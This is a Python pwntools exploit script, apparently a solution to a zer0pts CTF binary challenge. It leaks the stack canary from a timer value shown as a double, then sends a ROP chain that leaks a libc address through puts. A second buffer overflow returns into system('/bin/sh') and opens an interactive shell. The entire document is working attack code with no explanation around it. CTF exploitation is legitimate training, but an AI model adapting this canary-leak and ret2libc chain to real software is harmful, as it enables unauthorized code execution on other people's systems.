from pwn import *
from struct import *
# context.log_level='debug'


# p = process('./chall', env={'LD_PRELOAD':'./libc.so.6'})
p = process('./chall')
e = ELF('./chall')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
# p = remote("pwn.ctf.zer0pts.com", 9002)
rop_ret = 0x00400e94
rop_pop_rdi = 0x00400e93
def dtoi(f):
    return (unpack('<Q', pack('<d', f))[0])


p.sendlineafter('> ', str('taro'))
# pause()
p.sendlineafter('> ', str(15))
# pause()
p.sendlineafter(': ', str("+"))
# pause()
p.recvuntil('Stop the timer as close to ')
canary = p.recvregex("(\-*\d+\.\d+)")
p.send("\n\n")
if float(canary) == 0.0:
    log.warn("BAD Luck!")
    exit(1)

canary =  dtoi(float(canary))
log.info('Canary '+str(hex(canary)))

PAYLOAD = b'A' * 0x18
PAYLOAD += p64(canary)
PAYLOAD += p64(0xdeadbeef)
PAYLOAD += p64(rop_pop_rdi)
PAYLOAD += p64(0x601ff0) # _lib_start_main
PAYLOAD += p64(e.plt["puts"])
PAYLOAD += p64(e.sym["_start"])
assert b'\n' not in PAYLOAD
assert b' ' not in PAYLOAD
p.sendlineafter("(Y/n) ", PAYLOAD)

libc_base = u64(p.recv(6).ljust(8, '\x00')) - libc.sym['__libc_start_main']
log.info('LIBC BASE '+hex(libc_base))

system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()


PAYLOAD = b'A'*0x88
PAYLOAD += p64(canary)
PAYLOAD += p64(0xdeadbeef)
PAYLOAD += p64(rop_ret)
PAYLOAD += p64(rop_pop_rdi)
PAYLOAD += p64(binsh)
PAYLOAD += p64(system)
p.sendlineafter('> ', PAYLOAD)

p.interactive()